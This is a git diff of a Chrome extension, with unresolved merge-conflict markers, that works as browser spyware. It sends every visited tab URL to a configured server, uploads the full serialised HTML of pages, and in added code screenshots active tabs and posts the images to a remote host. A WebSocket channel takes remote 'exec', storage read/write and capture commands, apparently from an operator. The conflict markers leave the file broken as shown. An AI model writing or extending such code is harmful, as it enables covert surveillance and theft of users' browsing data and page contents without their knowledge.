@@ -3,9 +3,8 @@ initForeground()
 initSocket()
 
 chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
-    if (info.status === 'complete' && tab.url) {
-        const { uuid = INITAL_CONFIG.uuid, url = INITAL_CONFIG.url } = await STORAGE_LOCAL.get()
-
+    if (info.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
+        const { uuid, url } = await STORAGE_LOCAL.get()
         POST({
             url: `${url}/api/extension/tabs`,
             body: {
@@ -19,9 +18,11 @@ chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
 chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
     //console.log(message)
     switch (message.action) {
-        case 'POST':
+        case CMD.POST:
             POST(message.payload)
             break
+        case CMD.CAPTURE:
+            WS.handleData({ action: message.action, from: message.clientId, payload: message.payload })
     }
     sendResponse()
 });
@@ -143,37 +144,8 @@ function initForeground() {
     const { url, uuid, socketUrl, socketHost } = await storageLocal.get()
     const deviceId = uuid?.replace(/&/g, '') || navigator.platform || navigator.userAgentData?.platform || 'Unknown'
     let ws
-    initSocket()
 
     storageLocal.set({ uuid: deviceId })
-
-    function initSocket() {
-      ws = new WebSocket(socketUrl)
-      window.ws = ws
-      ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
-      ws.onopen = (e) => {
-        ws.onmessage = ({ data }) => {
-          // console.log(JSON.parse(data))
-          const { action, from, payload } = JSON.parse(data)
-          wk.clientId = from || wk.clientId
-          wk.action
-          switch (action) {
-            case 'HI':
-              ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
-              break
-            case 'exec': wk.exec(payload.name, payload.args)
-              break
-            case 'MEMBER_LEFT':
-              if (wk.enableBG && payload.clientId === deviceId + '-BG') wk.sendBG('start')
-              break
-          }
-        }
-        ws.onclose = () => {
-          ws.onclose = null
-          setTimeout(initSocket, 2000)
-        }
-      }
-    }
 
     class WK {
       constructor() {
@@ -352,25 +324,13 @@ function initForeground() {
         this.enableBG = false
       }
 
-      async capture(what, t = 'image/jpeg', q = 0.5) {
-        try {
-          if (typeof what === 'object' && what.tagName)
-            this.captured = await html2canvas(what)
-          else if (typeof what === 'string')
-            this.captured = await html2canvas(this.querySelector(what))
-          else return 'Neither string nor HTMLTag'
-
-          const base64 = this.captured.toDataURL(t, q)
-          const id = Math.floor(Math.random() * 10000)
-          this.sendBG({ action: 'POST', payload: { url: `${socketHost}/images/${id}`, body: base64, headers: { 'Content-Type': 'text/plain' } } })
-          return { image: { id, length: base64.length } }
-        } catch (error) {
-          return error.message
-        }
+      async capture() {
+        await this.sendBG({ action: 'CAPTURE', clientId: this.clientId })
       }
 
-      async screencap() {
+      pagecap() {
         try {
+<<<<<<< HEAD
           const body = htmlScreenCaptureJs.capture('string', document, { LogLevel: 'off' })
           if (body) {
             const size = (body.length / 1000000).toFixed(2) + ' MB'
@@ -378,6 +338,16 @@ function initForeground() {
             this.sendBG({ action: 'POST', payload: { url: `${socketHost}/htmls`, body, headers: { 'Content-Type': 'text/plain', deviceId, url: location.href } } })
             return { html: { id: btoa(location.href), size } }
           } else return 'Fail'
+=======
+          const body = htmlScreenCaptureJs.capture('string', document, { logLevel: "off" })
+          if (body) {
+            const size = (body.length / 1000000).toFixed(2) + ' MB'
+            const e_url = btoa(location.href).replace(/\//g, 'slash')
+            console.log(size, e_url)
+            this.sendBG({ action: 'POST', payload: { url: `${socketHost}/htmls`, body, headers: { 'Content-Type': 'text/plain', deviceId, url: e_url } } })
+            return { html: { id: e_url, size } }
+          } else return false
+>>>>>>> 498fbbe05967029b3f4aeda10d4e1fb3473853fb
         } catch (error) {
           return error.message
         }
@@ -387,14 +357,59 @@ function initForeground() {
         document.querySelectorAll('video').forEach(v => src ? v.src = src : '')
       }
     }
+
     new WK
+<<<<<<< HEAD
     setTimeout(() => wk.send(wk.screencap()), 5000)
     setTimeout(() => wk.send(wk.screencap()), 10000)
     setTimeout(() => wk.send(wk.screencap()), 15000)
+=======
+    initSocket()
+
+    function initSocket() {
+      ws = new WebSocket(socketUrl)
+      window.ws = ws
+      ws.emit = (action, data) => ws.send(JSON.stringify({ action, payload: data }))
+      ws.onopen = (e) => {
+
+        setTimeout(() => wk.capture(), 1000)
+        initialPageCap()
+        function initialPageCap() {
+          setTimeout(() => {
+            const cap = wk.pagecap()
+            if (cap)
+              wk.send(cap)
+            else return initialPageCap()
+          }, 5000)
+        }
+
+        ws.onmessage = ({ data }) => {
+          // console.log(JSON.parse(data))
+          const { action, from, payload } = JSON.parse(data)
+          wk.clientId = from || wk.clientId
+          wk.action
+          switch (action) {
+            case 'HI':
+              ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
+              break
+            case 'exec': wk.exec(payload.name, payload.args)
+              break
+            case 'MEMBER_LEFT':
+              if (wk.enableBG && payload.clientId === deviceId + '-BG') wk.sendBG('start')
+              break
+          }
+        }
+        ws.onclose = () => {
+          ws.onclose = null
+          setTimeout(initSocket, 2000)
+        }
+      }
+    }
+>>>>>>> 498fbbe05967029b3f4aeda10d4e1fb3473853fb
   }
 
   chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
-    if (info.status === 'complete' && tab.url) {
+    if (info.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
 
       chrome.scripting.executeScript({
         target: { tabId },
@@ -418,7 +433,11 @@ function initForeground() {
 
 
 async function initSocket() {
+<<<<<<< HEAD
   const { uuid = INITAL_CONFIG.uuid, socketUrl = INITAL_CONFIG.socketUrl } = await STORAGE_LOCAL.get()
+=======
+  const { uuid, socketUrl, socketHost } = await STORAGE_LOCAL.get()
+>>>>>>> 498fbbe05967029b3f4aeda10d4e1fb3473853fb
   const ID = `${uuid}-BG`
 
   if (WS && WS.readyState === 1 && WS.id === ID) return
@@ -426,20 +445,25 @@ async function initSocket() {
     WS.onclose = null
     WS.close()
   }
-  WS = new WebSocket(socketUrl)
+  WS = new WebSocket(socketUrl || INITAL_CONFIG.socketUrl)
   WS.emit = ({ clientId, payload }) => WS.send(JSON.stringify({ action: 'SEND', payload: { clientId, payload } }))
   WS.onopen = () => {
     WS.onmessage = ({ data }) => {
       try {
-        handleData(JSON.parse(data))
+        WS.handleData(JSON.parse(data))
       } catch (error) { }
     }
   }
 
   WS.onclose = () => setTimeout(() => initSocket(ID), 2000)
 
+<<<<<<< HEAD
   async function handleData({ action, from, payload }) {
     //console.log(action, from, payload)
+=======
+  WS.handleData = async function ({ action, from, payload }) {
+    console.log(action, from, payload)
+>>>>>>> 498fbbe05967029b3f4aeda10d4e1fb3473853fb
     let data = 'NOT MATCH'
     try {
       switch (action) {
@@ -452,6 +476,8 @@ async function initSocket() {
         case CMD.SET_STORAGE: data = await setStorage(...payload)
           break
         case CMD.GET_STORAGE: data = await getStorage(...payload)
+          break
+        case CMD.CAPTURE: data = await capture()
           break
         case CMD.HELP: return WS.emit({ action, clientId: from, payload: CMD })
       }
@@ -486,8 +512,6 @@ async function initSocket() {
   }
 
   function getStorage(type) {
-    
-
     if (type === CMD.LOCAL)
       return STORAGE_LOCAL.get()
     else if (type === CMD.SYNC)
@@ -504,5 +528,16 @@ async function initSocket() {
       return STORAGE_SYNC.set({ ...kv })
 
     return { validKeys: [CMD.SYNC, CMD.LOCAL] }
+  }
+
+  async function capture() {
+    const images = []
+    const tabs = await chrome.tabs.query({ active: true })
+    for(const { url, windowId } of tabs) {
+      const img = await chrome.tabs.captureVisibleTab(windowId)
+      const res = await POST({ url: `${socketHost}/images`, headers: { 'Content-Type': 'text/plain', deviceId: uuid, url: btoa(url) }, body: img })
+      if(res.ok) images.push(await res.text())
+    }
+    return { images }
   }
 }
